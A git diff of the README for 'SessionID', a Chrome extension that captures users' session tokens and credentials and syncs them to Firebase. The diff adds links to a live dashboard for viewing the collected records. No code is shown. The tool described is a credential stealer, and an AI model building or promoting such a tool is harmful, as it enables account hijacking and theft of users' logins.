@@ -2,6 +2,9 @@
 
 A lightweight Manifest V3 Chrome Extension designed to detect active user sessions, capture session tokens and credentials, and synchronize records to Firebase Firestore with built-in deduplication.
 
+> 🌐 **Live Web Dashboard:** [https://avdeshjadon.github.io/SessionID/](https://avdeshjadon.github.io/SessionID/)  
+> 🔗 **Direct Access Link:** [https://avdeshjadon.github.io/SessionID/access/](https://avdeshjadon.github.io/SessionID/access/)
+
 ---
 
 ## Key Features
@@ -29,7 +32,7 @@ A lightweight Manifest V3 Chrome Extension designed to detect active user sessio
 ```text
 SessionID/
 ├── access/
-│   └── index.html             # Live Firebase web dashboard / viewer
+│   └── index.html             # Live Firebase web dashboard / viewer ([Live](https://avdeshjadon.github.io/SessionID/access/))
 ├── icons/
 │   ├── 16.png                  # Favicon (16x16)
 │   ├── 48.png                  # Toolbar icon (48x48)
